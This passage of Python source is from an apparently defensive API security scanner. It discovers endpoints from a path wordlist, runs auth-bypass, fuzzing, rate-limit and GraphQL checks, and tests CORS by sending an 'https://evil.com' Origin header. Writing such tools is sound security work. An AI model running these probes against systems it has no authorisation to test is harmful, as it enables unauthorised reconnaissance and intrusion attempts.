        self.rate_limit_tester = RateLimitTester()
        
        # Results storage
        self.test_results: List[APITestResult] = []
        self.discovered_endpoints: List[APIEndpoint] = []
        self.vulnerabilities: List[Dict[str, Any]] = []
    
    @handle_errors
    def discover_endpoints(self, wordlist: List[str] = None) -> List[APIEndpoint]:
        """Discover API endpoints"""
        if self.simulation.is_simulation_mode():
            return self.simulation.simulate_api_discovery(self.base_url)
        
        discovered = []
        
        # Common API paths
        if not wordlist:
            wordlist = [
                '/api', '/api/v1', '/api/v2', '/api/v3',
                '/v1', '/v2', '/v3',
                '/graphql', '/graphiql',
                '/users', '/user', '/account', '/accounts',
                '/auth', '/authenticate', '/login', '/logout', '/register',
                '/admin', '/dashboard', '/settings',
                '/products', '/items', '/search',
                '/health', '/status', '/metrics',
                '/.well-known/openapi.json', '/swagger.json', '/api-docs'
            ]
        
        for path in wordlist:
            for method in [HTTPMethod.GET, HTTPMethod.POST]:
                try:
                    response = requests.request(
                        method=method.value,
                        url=self.base_url + path,
                        timeout=5,
                        allow_redirects=False
                    )
                    
                    if response.status_code not in [404, 405]:
                        endpoint = APIEndpoint(
                            url=self.base_url,
                            method=method,
                            path=path,
                            auth_required=response.status_code == 401
                        )
                        discovered.append(endpoint)
                        self.logger.info(f"Discovered endpoint: {method.value} {path}")
                        
                except Exception as e:
                    self.logger.debug(f"Error checking {method.value} {path}: {e}")
        
        self.discovered_endpoints = discovered
        return discovered
    
    @handle_errors
    def test_endpoint(self, endpoint: APIEndpoint, auth_config: Optional[AuthConfig] = None) -> APITestResult:
        """Comprehensive test of an API endpoint"""
        if self.simulation.is_simulation_mode():
            return self.simulation.simulate_api_test(endpoint)
        
        self.logger.info(f"Testing endpoint: {endpoint.method.value} {endpoint.path}")
        
        vulnerabilities = []
        
        # Test authentication
        if endpoint.auth_required or auth_config:
            auth_vulns = self.auth_tester.test_auth_bypass(endpoint, auth_config or AuthConfig(AuthType.NONE))
            vulnerabilities.extend(auth_vulns)
        
        # Fuzz parameters
        fuzz_vulns = self.fuzzer.fuzz_parameters(endpoint, auth_config)
        vulnerabilities.extend(fuzz_vulns)
        
        # Test rate limiting
        rate_limit_result = self.rate_limit_tester.test_rate_limits(endpoint, auth_config)
        if rate_limit_result.get('vulnerability'):
            vulnerabilities.append(rate_limit_result['vulnerability'])
        
        # GraphQL-specific tests
        if self.api_type == APIType.GRAPHQL and self.graphql_tester:
            # Test introspection
            intro_vuln = self.graphql_tester.test_introspection(
                endpoint.url + endpoint.path, 
                endpoint.headers
            )
            if intro_vuln:
                vulnerabilities.append(intro_vuln)
            
            # Test query depth
            depth_vuln = self.graphql_tester.test_query_depth_limit(
                endpoint.url + endpoint.path,
                endpoint.headers
            )
            if depth_vuln:
                vulnerabilities.append(depth_vuln)
            
            # Test batching
            batch_vuln = self.graphql_tester.test_batching_attack(
                endpoint.url + endpoint.path,
                endpoint.headers
            )
            if batch_vuln:
                vulnerabilities.append(batch_vuln)
        
        # Create test result
        result = APITestResult(
            endpoint=endpoint,
            test_type="comprehensive",
            status_code=200,  # Placeholder
            response_time=0.0,  # Placeholder
            headers={},
            body={},
            vulnerabilities=vulnerabilities
        )
        
        self.test_results.append(result)
        self.vulnerabilities.extend(vulnerabilities)
        
        return result
    
    @handle_errors
    def test_cors_configuration(self, endpoints: List[APIEndpoint] = None) -> List[Dict[str, Any]]:
        """Test CORS configuration across endpoints"""
        if not endpoints:
            endpoints = self.discovered_endpoints
        
        vulnerabilities = []
        
        for endpoint in endpoints:
            try:
                # Test with Origin header
                headers = endpoint.headers.copy()
                headers['Origin'] = 'https://evil.com'
                
                response = requests.request(
                    method=endpoint.method.value,
                    url=endpoint.url + endpoint.path,
                    headers=headers,
                    timeout=5
                )
                
                # Check CORS headers
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == '*' or acao == 'https://evil.com':
                    severity = 'HIGH' if acac.lower() == 'true' else 'MEDIUM'
                    
                    vulnerabilities.append({
                        'type': VulnerabilityType.CORS,
                        'severity': severity,
                        'description': 'CORS misconfiguration allows any origin',
                        'endpoint': endpoint.path,
                        'method': endpoint.method.value,
                        'evidence': {
                            'access_control_allow_origin': acao,
                            'access_control_allow_credentials': acac,
                            'test_origin': 'https://evil.com',
                            'recommendation': 'Restrict allowed origins to trusted domains'
                        }
                    })
                
            except Exception as e:
                self.logger.debug(f"Error testing CORS for {endpoint.path}: {e}")
        
        self.vulnerabilities.extend(vulnerabilities)
        return vulnerabilities
    
    @handle_errors
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive API testing report"""
        report = {
            'api_base_url': self.base_url,
            'api_type': self.api_type.value,
            'test_timestamp': datetime.now().isoformat(),
            'endpoints_discovered': len(self.discovered_endpoints),
            'endpoints_tested': len(self.test_results),
            'vulnerabilities_found': len(self.vulnerabilities),
            'vulnerability_summary': self._summarize_vulnerabilities(),
            'endpoints': [
                {
                    'path': endpoint.path,
                    'method': endpoint.method.value,
                    'auth_required': endpoint.auth_required
                } for endpoint in self.discovered_endpoints
            ],
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._generate_recommendations()
        }
        
        return report
    
    def _summarize_vulnerabilities(self) -> Dict[str, int]:
        """Summarize vulnerabilities by type and severity"""
        summary = {
            'by_type': {},
            'by_severity': {}
        }
        
        for vuln in self.vulnerabilities:
            # By type
            vuln_type = vuln['type'].value if isinstance(vuln['type'], VulnerabilityType) else vuln['type']
            summary['by_type'][vuln_type] = summary['by_type'].get(vuln_type, 0) + 1
            
            # By severity
            severity = vuln.get('severity', 'UNKNOWN')
            summary['by_severity'][severity] = summary['by_severity'].get(severity, 0) + 1
        
        return summary
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        vuln_types = {vuln['type'] for vuln in self.vulnerabilities}
        
        if VulnerabilityType.AUTH_BYPASS in vuln_types:
            recommendations.append("Implement proper authentication and authorization checks on all endpoints")
        
        if VulnerabilityType.INJECTION in vuln_types:
            recommendations.append("Use parameterized queries and input validation to prevent injection attacks")
        
        if VulnerabilityType.RATE_LIMIT in vuln_types:
            recommendations.append("Implement rate limiting to prevent API abuse and DoS attacks")
        
        if VulnerabilityType.CORS in vuln_types:
            recommendations.append("Configure CORS properly to restrict access to trusted origins only")
        
        if VulnerabilityType.INFO_DISCLOSURE in vuln_types:
            recommendations.append("Disable debug information and introspection in production environments")
        
        if self.api_type == APIType.GRAPHQL:
            recommendations.extend([
                "Implement query depth limiting to prevent resource exhaustion",
                "Use query cost analysis to prevent expensive queries",
                "Disable introspection in production",
                "Implement proper authorization at the field level"
            ])
        
        # General recommendations
        recommendations.extend([
            "Use HTTPS for all API communications",
            "Implement comprehensive logging and monitoring",
            "Regular security assessments and penetration testing",
            "Keep all dependencies and frameworks up to date"
        ])
        
        return list(set(recommendations))  # Remove duplicates


# Example usage
if __name__ == "__main__":
    # Test REST API
    api_tester = APITester("https://api.example.com", APIType.REST)
    
    # Discover endpoints
    endpoints = api_tester.discover_endpoints()
    print(f"Discovered {len(endpoints)} endpoints")
    
    # Test each endpoint
    for endpoint in endpoints:
        result = api_tester.test_endpoint(endpoint)
        print(f"Tested {endpoint.path}: {len(result.vulnerabilities)} vulnerabilities found")
    
    # Test CORS
    cors_vulns = api_tester.test_cors_configuration()
    print(f"CORS vulnerabilities: {len(cors_vulns)}")
    
    # Generate report
    report = api_tester.generate_report()
    print(f"\nAPI Security Report:")
    print(f"- Endpoints discovered: {report['endpoints_discovered']}")
    print(f"- Vulnerabilities found: {report['vulnerabilities_found']}")
    print(f"- Recommendations: {len(report['recommendations'])}")
    
    # Test GraphQL API
    graphql_tester = APITester("https://api.example.com/graphql", APIType.GRAPHQL)
    
    # Test GraphQL endpoint
    graphql_endpoint = APIEndpoint(
        url="https://api.example.com",
        method=HTTPMethod.POST,
        path="/graphql",
        content_type="application/json"
    )
    
    graphql_result = graphql_tester.test_endpoint(graphql_endpoint)
    print(f"\nGraphQL test: {len(graphql_result.vulnerabilities)} vulnerabilities found")